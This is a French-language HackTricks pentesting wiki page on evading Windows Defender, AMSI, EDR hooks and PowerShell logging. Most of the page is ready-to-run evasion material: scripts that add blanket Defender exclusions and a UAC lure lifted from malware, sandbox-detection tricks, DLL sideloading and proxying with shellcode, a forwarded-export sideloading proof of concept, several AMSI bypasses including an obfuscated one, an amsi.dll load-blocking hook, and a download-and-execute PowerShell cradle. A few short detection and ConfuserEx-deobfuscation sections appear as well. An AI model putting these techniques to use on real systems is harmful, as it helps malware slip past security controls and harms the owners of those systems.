# Contournement de l’antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Cette page a été initialement rédigée par** [**@m2rc_p**](https://twitter.com/m2rc_p)** !**

## Arrêter Defender

- [defendnot](https://github.com/es3n1n/defendnot) : un outil pour empêcher Windows Defender de fonctionner.
- [no-defender](https://github.com/es3n1n/no-defender) : un outil pour empêcher Windows Defender de fonctionner en simulant un autre AV.
- [Désactiver Defender si vous êtes admin](basic-powershell-for-pentesters/README.md)

### Leurre UAC de type installateur avant la désactivation de Defender

Les loaders publics se faisant passer pour des cheats de jeu sont souvent distribués sous forme d’installateurs Node.js/Nexe non signés qui **demandent d’abord à l’utilisateur une élévation de privilèges**, puis neutralisent Defender. Le processus est simple :

1. Vérifier si le contexte est administratif avec `net session`. Cette commande ne réussit que si l’appelant dispose des droits admin ; un échec indique donc que le loader s’exécute en tant qu’utilisateur standard.
2. Se relancer immédiatement avec le verbe `RunAs` afin de déclencher l’invite de consentement UAC attendue tout en conservant la ligne de commande d’origine.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Les victimes pensent déjà installer un logiciel « cracké », elles acceptent donc généralement l’invite, donnant au malware les droits nécessaires pour modifier la stratégie de Defender.<sup>[[26]](#references)</sup>

### Exclusions `MpPreference` générales pour chaque lettre de lecteur

Une fois les privilèges élevés obtenus, les chaînes de type GachiLoader maximisent les angles morts de Defender au lieu de désactiver complètement le service. Le loader tue d’abord le watchdog de l’interface graphique (`taskkill /F /IM SecHealthUI.exe`), puis ajoute des **exclusions extrêmement larges** afin que chaque profil utilisateur, répertoire système et disque amovible échappe à l’analyse :

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Observations clés :

- La boucle parcourt tous les systèmes de fichiers montés (D:\, E:\, clés USB, etc.), donc **tout futur payload déposé n’importe où sur le disque sera ignoré**.
- L’exclusion de l’extension `.sys` est préventive : les attaquants se réservent la possibilité de charger ultérieurement des drivers non signés sans avoir à modifier de nouveau Defender.
- Toutes les modifications sont enregistrées sous `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, ce qui permet aux étapes suivantes de vérifier que les exclusions persistent ou de les étendre sans déclencher à nouveau l’UAC.

Comme aucun service Defender n’est arrêté, les vérifications d’état naïves indiquent toujours que « l’antivirus est actif », même si l’analyse en temps réel ne surveille jamais ces chemins.<sup>[[26]](#references)</sup>

## **Méthodologie d’évasion AV**

Actuellement, les AV utilisent différentes méthodes pour déterminer si un fichier est malveillant : la détection statique, l’analyse dynamique et, pour les EDR les plus avancés, l’analyse comportementale.

### **Détection statique**

La détection statique consiste à repérer des chaînes malveillantes connues ou des séquences d’octets dans un binaire ou un script, ainsi qu’à extraire des informations du fichier lui-même (par exemple, sa description, le nom de l’entreprise, les signatures numériques, l’icône, la somme de contrôle, etc.). Cela signifie que l’utilisation d’outils publics connus peut vous faire repérer plus facilement, car ils ont probablement déjà été analysés et signalés comme malveillants. Voici quelques moyens de contourner ce type de détection :

- **Chiffrement**

Si vous chiffrez le binaire, l’AV ne pourra pas détecter votre programme, mais vous aurez besoin d’un loader pour le déchiffrer et l’exécuter en mémoire.

- **Obfuscation**

Parfois, il suffit de modifier certaines chaînes dans votre binaire ou votre script pour passer sous le radar de l’AV, mais cela peut prendre du temps selon ce que vous essayez d’obfusquer.

- **Outils personnalisés**

Si vous développez vos propres outils, ils ne présenteront pas de signatures malveillantes connues, mais cela demande beaucoup de temps et d’efforts.

> [!TIP]
> Pour vérifier la détection statique de Windows Defender, ThreatCheck est un bon outil : [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Il divise le fichier en plusieurs segments et demande à Defender d’analyser chacun d’eux séparément. Il peut ainsi vous indiquer précisément quelles chaînes ou quels octets de votre binaire sont signalés.

Je vous recommande vivement cette [playlist YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sur l’évasion AV en pratique.

### **Analyse dynamique**

L’analyse dynamique consiste à exécuter votre binaire dans une sandbox et à surveiller toute activité malveillante (par exemple, tenter de déchiffrer et de lire les mots de passe de votre navigateur, effectuer un minidump de LSASS, etc.). Cette partie peut être un peu plus délicate, mais voici quelques moyens d’échapper aux sandboxes.

- **Attendre avant l’exécution** Selon la façon dont elle est implémentée, cette méthode peut être très efficace pour contourner l’analyse dynamique des AV. Les AV disposent de très peu de temps pour analyser les fichiers sans interrompre le travail de l’utilisateur ; de longues périodes d’attente peuvent donc perturber l’analyse des binaires. Le problème est que de nombreuses sandboxes d’AV peuvent simplement ignorer cette attente, selon la façon dont elle est implémentée.
- **Vérifier les ressources de la machine** Les sandboxes disposent généralement de très peu de ressources (par exemple, moins de 2 Go de RAM), faute de quoi elles risqueraient de ralentir la machine de l’utilisateur. Vous pouvez aussi faire preuve de créativité : par exemple, vérifier la température du CPU ou même la vitesse des ventilateurs. Tout ne sera pas simulé dans la sandbox.
- **Vérifications propres à la machine** Si vous ciblez un utilisateur dont le poste de travail est joint au domaine « contoso.local », vous pouvez vérifier le domaine de l’ordinateur. S’il ne correspond pas à celui spécifié, vous pouvez faire quitter le programme.

Il s’avère que le nom d’ordinateur de la sandbox de Microsoft Defender est HAL9TH. Vous pouvez donc vérifier le nom de l’ordinateur dans votre malware avant son déclenchement : s’il correspond à HAL9TH, cela signifie que vous êtes dans la sandbox de Defender et vous pouvez faire quitter le programme.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source : <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Voici d’autres très bons conseils de [@mgeeky](https://twitter.com/mariuszbit) pour échapper aux sandboxes.

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> canal #malware-dev</p></figcaption></figure>

Comme nous l’avons déjà dit dans cet article, les **outils publics** finiront par **être détectés**. Vous devriez donc vous poser la question suivante :

Par exemple, si vous voulez dumper LSASS, **avez-vous vraiment besoin d’utiliser mimikatz** ? Ou pourriez-vous utiliser un autre projet moins connu qui dumpe également LSASS ?

La deuxième option est probablement la bonne. Prenons mimikatz : c’est probablement l’un des malwares les plus signalés par les AV et les EDR, sinon le plus signalé. Même si le projet est très intéressant, il est aussi extrêmement difficile à utiliser pour contourner les AV. Cherchez donc des alternatives adaptées à ce que vous essayez d’accomplir.

> [!TIP]
> Lorsque vous modifiez vos payloads pour échapper à la détection, veillez à **désactiver l’envoi automatique d’échantillons** dans Defender et, surtout, **NE LES TÉLÉVERSEZ PAS SUR VIRUSTOTAL** si vous voulez rester indétectable à long terme. Pour vérifier si un AV particulier détecte votre payload, installez-le sur une VM, essayez de désactiver l’envoi automatique d’échantillons et testez-le jusqu’à ce que le résultat vous convienne.

## EXE vs DLL

Dans la mesure du possible, **privilégiez toujours les DLL pour l’évasion**. D’après mon expérience, les fichiers DLL sont généralement **beaucoup moins détectés et analysés**. C’est donc une astuce très simple pour éviter la détection dans certains cas (si votre payload peut bien sûr être exécuté en tant que DLL).

Comme le montre cette image, un payload DLL de Havoc a un taux de détection de 4/26 sur antiscan.me, tandis que le payload EXE a un taux de 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>Comparaison sur antiscan.me d’un payload EXE Havoc classique et d’une DLL Havoc classique</p></figcaption></figure>

Nous allons maintenant présenter quelques astuces permettant d’être beaucoup plus furtif avec les fichiers DLL.

## DLL Sideloading & Proxying

Le **DLL Sideloading** exploite l’ordre de recherche des DLL utilisé par le loader en plaçant côte à côte l’application victime et le ou les payloads malveillants.

Vous pouvez rechercher des programmes vulnérables au DLL Sideloading avec [Siofra](https://github.com/Cybereason/siofra) et le script PowerShell suivant :

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Cette commande affichera la liste des programmes susceptibles au DLL hijacking dans « C:\Program Files\\ » ainsi que les fichiers DLL qu’ils tentent de charger.

Je vous recommande vivement d’**explorer vous-même les programmes pouvant faire l’objet de DLL Hijacking/Sideloading**. Cette technique est assez furtive lorsqu’elle est bien exécutée, mais si vous utilisez des programmes publiquement connus pouvant faire l’objet de DLL Sideloading, vous risquez de vous faire repérer facilement.

Le simple fait de placer une DLL malveillante portant le nom d’une DLL qu’un programme s’attend à charger ne chargera pas votre payload, car le programme s’attend à trouver certaines fonctions dans cette DLL. Pour résoudre ce problème, nous allons utiliser une autre technique appelée **DLL Proxying/Forwarding**.

Le **DLL Proxying** redirige les appels effectués par un programme depuis la DLL proxy (et malveillante) vers la DLL d’origine. Cela préserve ainsi les fonctionnalités du programme tout en permettant l’exécution de votre payload.

J’utiliserai le projet [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/).

Voici les étapes que j’ai suivies :

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

La dernière commande nous fournira 2 fichiers : un modèle de code source de DLL et la DLL d’origine renommée.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Voici les résultats :

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Notre shellcode (encodé avec [SGN](https://github.com/EgeBalci/sgn)) et la proxy DLL ont tous deux un taux de détection de 0/26 sur [antiscan.me](https://antiscan.me) ! Je dirais que c’est une réussite.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Je vous **recommande vivement** de regarder le [VOD Twitch de S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) sur le DLL Sideloading, ainsi que la [vidéo d’ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), pour approfondir ce dont nous avons parlé.

### Abus des exports transférés (ForwardSideLoading)

Les modules PE de Windows peuvent exporter des fonctions qui sont en réalité des « forwarders » : au lieu de pointer vers du code, l’entrée d’export contient une chaîne ASCII de la forme `TargetDll.TargetFunc`. Lorsqu’un appelant résout cet export, le chargeur Windows va :

- Charger `TargetDll` s’il ne l’est pas déjà
- Résoudre `TargetFunc` dans ce module

Comportements clés à comprendre :
- Si `TargetDll` est une KnownDLL, il est fourni depuis l’espace de noms protégé KnownDLLs (par exemple, ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Si `TargetDll` n’est pas une KnownDLL, l’ordre de recherche normal des DLL est utilisé, ce qui inclut le répertoire du module qui effectue la résolution du forwarder.

Cela permet une primitive indirecte de sideloading : trouver une DLL signée qui exporte une fonction redirigée vers un nom de module qui n’est pas une KnownDLL, puis placer cette DLL signée à côté d’une DLL contrôlée par l’attaquant, nommée exactement comme le module cible indiqué par le forwarder. Lorsque l’export redirigé est appelé, le chargeur résout le forward et charge votre DLL depuis le même répertoire, exécutant ainsi votre DllMain.<sup>[[13]](#references)</sup>

Exemple observé sous Windows 11 :

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` n’est pas une KnownDLL ; elle est donc résolue selon l’ordre de recherche normal.

PoC (copier-coller) :
1) Copier la DLL système signée dans un dossier accessible en écriture
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Déposez une `NCRYPTPROV.dll` malveillante dans le même dossier. Un `DllMain` minimal suffit pour obtenir une exécution de code ; vous n’avez pas besoin d’implémenter la fonction redirigée pour déclencher `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Déclencher le transfert avec un LOLBin signé :
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Comportement observé :
- rundll32 (signé) charge le `keyiso.dll` side-by-side (signé)
- Lors de la résolution de `KeyIsoSetAuditingInterface`, le chargeur suit le renvoi vers `NCRYPTPROV.SetAuditingInterface`
- Le chargeur charge ensuite `NCRYPTPROV.dll` depuis `C:\test` et exécute son `DllMain`
- Si `SetAuditingInterface` n'est pas implémentée, une erreur « missing API » apparaît seulement après l'exécution de `DllMain`

Conseils de recherche :
- Concentrez-vous sur les exports redirigés dont le module cible n'est pas un KnownDLL. Les KnownDLLs sont répertoriées sous `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Vous pouvez énumérer les exports redirigés à l'aide d'outils tels que :
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consultez l’inventaire des forwarders de Windows 11 pour rechercher des candidats : https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Idées de détection/défense :
- Surveillez les LOLBins (par ex., rundll32.exe) qui chargent des DLL signées depuis des chemins non système, puis chargent des DLL qui ne sont pas des KnownDLLs et qui portent le même nom de base depuis ce répertoire
- Déclenchez une alerte sur les chaînes de processus/modules telles que : `rundll32.exe` → `keyiso.dll` non système → `NCRYPTPROV.dll` dans des chemins accessibles en écriture par l’utilisateur
- Appliquez des politiques d’intégrité du code (WDAC/AppLocker) et interdisez l’écriture et l’exécution dans les répertoires d’applications

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze est un toolkit de payload permettant de contourner les EDR à l’aide de processus suspendus, de syscalls directs et de méthodes d’exécution alternatives`

Vous pouvez utiliser Freeze pour charger et exécuter votre shellcode de manière furtive.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> L’évasion est un jeu du chat et de la souris : ce qui fonctionne aujourd’hui pourrait être détecté demain. Ne vous fiez donc jamais à un seul outil ; si possible, essayez d’enchaîner plusieurs techniques d’évasion.

## Syscalls directs/indirects et résolution des SSN (SysWhispers4)

Les EDR placent souvent des **hooks inline en mode utilisateur** sur les stubs de syscall de `ntdll.dll`. Pour contourner ces hooks, vous pouvez générer des stubs de syscall **directs** ou **indirects** qui chargent le **SSN** (System Service Number) correct et passent en mode noyau sans exécuter le point d’entrée d’export intercepté.<sup>[[32]](#references)</sup>

**Options d’invocation :**
- **Direct (embedded)** : émettre une instruction `syscall`/`sysenter`/`SVC #0` dans le stub généré (sans passer par un export de `ntdll`).
- **Indirect** : sauter vers un gadget `syscall` existant dans `ntdll` afin que la transition vers le noyau semble provenir de `ntdll` (utile pour l’évasion heuristique) ; **randomized indirect** choisit un gadget dans un pool à chaque appel.
- **Egg-hunt** : éviter d’intégrer la séquence d’opcodes statique `0F 05` sur le disque ; résoudre une séquence syscall à l’exécution.

**Stratégies de résolution des SSN résistantes aux hooks :**
- **FreshyCalls (VA sort)** : déduire les SSN en triant les stubs syscall par adresse virtuelle plutôt qu’en lisant les octets des stubs.
- **SyscallsFromDisk** : mapper un `\KnownDlls\ntdll.dll` propre, lire les SSN dans son `.text`, puis le démapper (contourne tous les hooks en mémoire).
- **RecycledGate** : combiner la déduction des SSN par tri des adresses virtuelles avec la validation des opcodes lorsqu’un stub est propre ; revenir à la déduction par adresse virtuelle s’il est intercepté.
- **HW Breakpoint** : définir DR0 sur l’instruction `syscall` et utiliser un VEH pour récupérer le SSN depuis `EAX` à l’exécution, sans analyser les octets interceptés.

Exemple d’utilisation de SysWhispers4 :
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI a été créé pour empêcher les « [fileless malware](https://en.wikipedia.org/wiki/Fileless_malware) ». Au départ, les antivirus ne pouvaient analyser que les **fichiers sur le disque**. Ainsi, si vous parveniez à exécuter des payloads **directement en mémoire**, l’antivirus ne pouvait rien faire pour l’en empêcher, car il n’avait pas suffisamment de visibilité.

La fonctionnalité AMSI est intégrée aux composants Windows suivants.

- Contrôle de compte d’utilisateur, ou UAC (élévation d’EXE, de COM, de MSI ou installation d’ActiveX)
- PowerShell (scripts, utilisation interactive et évaluation dynamique de code)
- Windows Script Host (wscript.exe et cscript.exe)
- JavaScript et VBScript
- Macros VBA d’Office

Elle permet aux solutions antivirus d’inspecter le comportement des scripts en exposant leur contenu sous une forme à la fois non chiffrée et non obfusquée.

L’exécution de `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` déclenche l’alerte suivante dans Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Remarquez qu’il ajoute le préfixe `amsi:`, suivi du chemin vers l’exécutable qui a lancé le script, ici powershell.exe.

Nous n’avons déposé aucun fichier sur le disque, mais nous avons tout de même été détectés en mémoire à cause d’AMSI.

De plus, depuis **.NET 4.8**, le code C# est également analysé par AMSI. Cela concerne même le chargement de code en mémoire avec `Assembly.Load(byte[])`. C’est pourquoi il est recommandé d’utiliser des versions antérieures de .NET (comme 4.7.2 ou une version plus ancienne) pour l’exécution en mémoire, si vous voulez contourner AMSI.

Il existe plusieurs façons de contourner AMSI :

- **Obfuscation**

AMSI reposant principalement sur des détections statiques, modifier les scripts que vous essayez de charger peut donc être un bon moyen d’échapper à la détection.

Cependant, AMSI peut désobfusquer les scripts, même s’ils comportent plusieurs couches. L’obfuscation peut donc être une mauvaise option, selon la façon dont elle est réalisée. Il n’est ainsi pas si simple d’échapper à la détection. Parfois, il suffit de modifier quelques noms de variables pour que cela fonctionne ; tout dépend donc du niveau auquel un élément a été signalé.

- **AMSI Bypass**

Comme AMSI est implémenté en chargeant une DLL dans le processus powershell (ainsi que cscript.exe, wscript.exe, etc.), il est facile de la manipuler, même avec un utilisateur sans privilèges. En raison de cette faille dans l’implémentation d’AMSI, des chercheurs ont découvert plusieurs façons d’échapper à l’analyse d’AMSI.

**Provoquer une erreur**

Forcer l’échec de l’initialisation d’AMSI (amsiInitFailed) empêchera toute analyse de démarrer pour le processus en cours. Cette technique a d’abord été révélée par [Matt Graeber](https://twitter.com/mattifestation), puis Microsoft a développé une signature pour empêcher son utilisation à grande échelle.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Il a suffi d’une seule ligne de code PowerShell pour rendre AMSI inutilisable dans le processus PowerShell actuel. Cette ligne a bien sûr été détectée par AMSI lui-même ; il faut donc la modifier pour utiliser cette technique.

Voici un AMSI bypass modifié que j’ai repris de ce [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Keep in mind that this will probably get flagged once this post comes out, so you should not publish any code if your plan is to stay undetected.

**Memory Patching**

Cette technique a été découverte à l’origine par [@RastaMouse](https://twitter.com/_RastaMouse/) et consiste à trouver l’adresse de la fonction "AmsiScanBuffer" dans amsi.dll (chargée d’analyser les entrées fournies par l’utilisateur) et à la remplacer par des instructions qui renvoient le code E_INVALIDARG. Ainsi, le résultat de l’analyse réelle renverra 0, ce qui sera interprété comme un résultat propre.

> [!TIP]
> Veuillez consulter [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) pour une explication plus détaillée.

De nombreuses autres techniques permettent également de contourner AMSI avec powershell. Consultez [**cette page**](basic-powershell-for-pentesters/index.html#amsi-bypass) et [**ce dépôt**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) pour en savoir plus.

### Bloquer AMSI en empêchant le chargement de amsi.dll (hook LdrLoadDll)

AMSI est initialisé uniquement après le chargement de `amsi.dll` dans le processus actuel. Un contournement robuste, indépendant du langage, consiste à placer un hook en mode utilisateur sur `ntdll!LdrLoadDll` qui renvoie une erreur lorsque le module demandé est `amsi.dll`. Ainsi, AMSI ne se charge jamais et aucune analyse n’a lieu pour ce processus.<sup>[[23]](#references)</sup>

Vue d’ensemble de l’implémentation (pseudocode C/C++ x64) :
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Remarques
- Fonctionne avec PowerShell, WScript/CScript et les loaders personnalisés (tout ce qui chargerait autrement AMSI).
- À combiner avec l’envoi des scripts via stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) pour éviter les artefacts de ligne de commande trop longs.
- Utilisé par des loaders exécutés via des LOLBins (par exemple, `regsvr32` appelant `DllRegisterServer`).

L’outil **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** génère également des scripts pour contourner AMSI.
L’outil **[https://amsibypass.com/](https://amsibypass.com/)** génère également des scripts pour contourner AMSI et éviter les signatures grâce à des fonctions définies par l’utilisateur et randomisées, des variables et des expressions de caractères, et en appliquant une casse aléatoire aux mots-clés PowerShell.

**Supprimer la signature détectée**

Vous pouvez utiliser des outils tels que **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** et **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** pour supprimer de la mémoire du processus actuel la signature AMSI détectée. Cet outil analyse la mémoire du processus actuel à la recherche de la signature AMSI, puis la remplace par des instructions NOP, ce qui la supprime effectivement de la mémoire.

**Produits AV/EDR qui utilisent AMSI**

Vous trouverez une liste des produits AV/EDR qui utilisent AMSI dans **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Utiliser PowerShell version 2**
Si vous utilisez PowerShell version 2, AMSI ne sera pas chargé, et vous pourrez donc exécuter vos scripts sans qu’ils soient analysés par AMSI. Voici comment faire :

```bash
powershell.exe -version 2
```

## Journalisation PowerShell

La journalisation PowerShell est une fonctionnalité qui permet de consigner toutes les commandes PowerShell exécutées sur un système. Cela peut être utile à des fins d’audit et de dépannage, mais cela peut aussi poser un **problème aux attaquants qui veulent échapper à la détection**.

Pour contourner la journalisation PowerShell, vous pouvez utiliser les techniques suivantes :

- **Désactiver PowerShell Transcription et Module Logging** : vous pouvez utiliser un outil tel que [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) à cette fin.
- **Utiliser PowerShell version 2** : si vous utilisez PowerShell version 2, AMSI ne sera pas chargé. Vous pourrez donc exécuter vos scripts sans qu’ils soient analysés par AMSI. Voici comment faire : `powershell.exe -version 2`
- **Utiliser une session PowerShell non managée** : utilisez [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) pour héberger PowerShell sans lancer `powershell.exe` (l’approche utilisée par `powerpick` de Cobalt Strike). Cela permet d’échapper aux contrôles visant spécifiquement le processus `powershell.exe`, mais ne désactive pas intrinsèquement AMSI, Script Block Logging ni les autres mécanismes de défense PowerShell ; la couverture dépend du runtime et de l’implémentation de l’hôte.


## Obfuscation

> [!TIP]
> Plusieurs techniques d’obfuscation reposent sur le chiffrement des données, ce qui augmente l’entropie du binaire et permet aux antivirus et aux EDR de le détecter plus facilement. Soyez prudent et n’appliquez éventuellement le chiffrement qu’à certaines parties de votre code qui sont sensibles ou doivent être dissimulées.

### Désobfuscation des binaires .NET protégés par ConfuserEx

Lors de l’analyse de malwares utilisant ConfuserEx 2 (ou des forks commerciaux), il est courant de rencontrer plusieurs couches de protection qui bloquent les décompilateurs et les sandboxes. Le workflow ci-dessous **restaure de manière fiable un IL presque original**, qui peut ensuite être décompilé en C# avec des outils tels que dnSpy ou ILSpy.<sup>[[10]](#references)</sup>

1.  Suppression de l’anti-altération – ConfuserEx chiffre chaque *corps de méthode* et le déchiffre dans le constructeur statique du *module* (`<Module>.cctor`). Il modifie également la somme de contrôle PE, de sorte que toute modification provoquera le plantage du binaire. Utilisez **AntiTamperKiller** pour localiser les tables de métadonnées chiffrées, récupérer les clés XOR et réécrire un assembly propre :
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   La sortie contient les 6 paramètres anti-tamper (`key0-key3`, `nameHash`, `internKey`), qui peuvent être utiles pour créer votre propre unpacker.

2.  Récupération des symboles / du control-flow – fournissez le fichier *clean* à **de4dot-cex** (un fork de de4dot compatible avec ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Options :
     • `-p crx` – sélectionner le profil ConfuserEx 2
     • de4dot annulera l’aplatissement du flux de contrôle, restaurera les espaces de noms, les classes et les noms de variables d’origine, et déchiffrera les chaînes constantes.

3.  Suppression des appels proxy – ConfuserEx remplace les appels directs de méthodes par des wrappers légers (aussi appelés *appels proxy*) pour compliquer davantage la décompilation. Supprimez-les avec **ProxyCall-Remover** :
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Après cette étape, vous devriez observer des API .NET courantes telles que `Convert.FromBase64String` ou `AES.Create()` au lieu de fonctions wrapper opaques (`Class8.smethod_10`, …).

4.  Nettoyage manuel – exécutez le binaire obtenu dans dnSpy, recherchez de grands blocs Base64 ou l’utilisation de `RijndaelManaged`/`TripleDESCryptoServiceProvider` pour localiser le véritable payload.  Souvent, le malware le stocke sous forme de tableau d’octets encodé en TLV, initialisé dans `<Module>.byte_0`.

La chaîne ci-dessus rétablit le flux d’exécution **sans** avoir à exécuter l’échantillon malveillant – ce qui est utile sur un poste de travail hors ligne.

> 🛈  ConfuserEx produit un attribut personnalisé nommé `ConfusedByAttribute`, qui peut servir d’IOC pour trier automatiquement les échantillons.

#### Commande en une ligne
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)** : obfuscateur C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator) : ce projet vise à fournir un fork open source de la suite de compilation [LLVM](http://www.llvm.org/) capable d'améliorer la sécurité logicielle grâce à l'[obfuscation de code](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) et à la protection contre les altérations.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator) : ADVobfuscator montre comment utiliser le langage `C++11/14` pour générer, à la compilation, du code obfusqué sans outil externe ni modification du compilateur.
